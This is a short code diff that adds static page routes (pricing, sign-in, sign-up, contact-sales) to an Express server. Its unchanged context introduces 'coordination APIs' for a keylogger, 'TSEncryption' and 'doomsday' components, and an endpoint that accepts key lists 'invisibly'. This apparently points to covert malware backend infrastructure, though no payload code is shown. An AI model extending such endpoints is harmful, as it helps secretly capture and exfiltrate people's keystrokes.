@@ -274,6 +274,14 @@ app.get('/admin/keys', requireAuth, requireAdmin, async (req, res) => {
 
 app.get('/ping', (req, res) => res.json({ status: 'ENGINE_ONLINE' }));
 
+// ─── Static pages ────────────────────────────────────────────────
+app.get('/pricing', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pricing.html')));
+app.get('/sign-in', (req, res) => res.sendFile(path.join(__dirname, 'public', 'sign-in.html')));
+app.get('/auth/sign-in', (req, res) => res.sendFile(path.join(__dirname, 'public', 'sign-in.html')));
+app.get('/auth/sign-up', (req, res) => res.sendFile(path.join(__dirname, 'public', 'sign-up.html')));
+app.get('/auth/forgot', (req, res) => res.sendFile(path.join(__dirname, 'public', 'forgot.html')));
+app.get('/contact-sales', (req, res) => res.sendFile(path.join(__dirname, 'public', 'contact-sales.html')));
+
 // ─── Tiny coordination APIs for TSAsync/TSEncryption/doomsday/keylogger ─────────────
 app.post('/api/tsync', express.json({ limit: '50kb' }), async (req, res) => {
   // Accept key list from TSAsync for GUI invisibly
